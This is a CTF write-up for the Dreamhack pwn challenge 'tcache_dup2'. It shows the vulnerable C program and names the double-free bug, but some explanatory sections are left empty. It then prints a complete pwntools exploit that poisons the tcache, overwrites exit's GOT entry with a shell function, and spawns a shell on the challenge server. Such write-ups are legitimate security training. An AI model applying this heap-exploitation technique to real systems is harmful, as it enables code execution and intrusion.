# tcache_dup2 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: libc-2.30.so, tcache_dup2.c, tcache_dup2(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec tcache_dup2
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}
```
## Vulnerability
### DFB(Double Free Bug)
``` c
void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}
```
## Exploit
### Strategy
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 15823)
context.arch = "amd64"
e = ELF('./tcache_dup2')
libc = ELF('x64/libc-2.30.so')

# func
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

# DFB setup: tcache->counts[tc_idx]
create(0x10, b'A'*8) # idx 0, chunk A
create(0x10, b'B'*8) # idx 1, chunk B
create(0x10, b'C'*8) # idx 2, chunk C
delete(2) # tcache: chunk C
delete(1) # tcache: chunk B -> chunk C
delete(0) # tcache: chunk A -> chunk B -> chunk C

# key overwrite
modify(0, 16, b'A'*0x10)
delete(0) # tcache: chunk A -> chunk A -> chunk B -> chunk C

# GOT overwrite
exit_GOT = e.got['exit']
get_shell = e.symbols['get_shell']
create(0x10, p64(exit_GOT)) # tcache: chunk A -> exit_GOT
create(0x10, b'A'*8) # tcache: exit_GOT
create(0x10, p64(get_shell)) # overwrite exit_GOT -> get_shell
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')

# interactive
p.interactive()
```
